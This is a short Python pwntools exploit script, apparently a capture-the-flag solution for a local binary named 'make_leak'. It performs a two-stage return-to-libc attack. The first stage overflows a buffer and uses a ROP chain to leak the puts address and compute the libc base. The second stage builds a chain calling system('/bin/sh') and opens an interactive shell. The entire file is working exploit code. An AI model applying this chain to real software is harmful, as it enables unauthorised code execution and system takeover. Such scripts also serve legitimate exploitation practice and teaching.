#!/usr/bin/python
from pwn import *
context.arch = "amd64"

p = process("./make_leak")
e = ELF("./make_leak")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# leak puts address
rop = ROP(e)
rop.puts(e.got["puts"])
rop.main()
p.sendline("A" * 40 + rop.chain())
p.readuntil("week.\n")
puts_leak = u64(p.read(6) + "\x00\x00")
libc.address = puts_leak - libc.symbols["puts"]
bin_sh_address = libc.search("/bin/sh").next()

log.info("leaked puts address: 0x{:>8x}".format(libc.symbols["puts"]))
log.info("found libc base address: 0x{:>8x}".format(libc.address))
log.info("found system address: 0x{:>8x}".format(libc.symbols["system"]))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

rop = ROP(libc)
rop.system(bin_sh_address)
p.sendline("A" * 40 + rop.chain()) 
p.interactive()
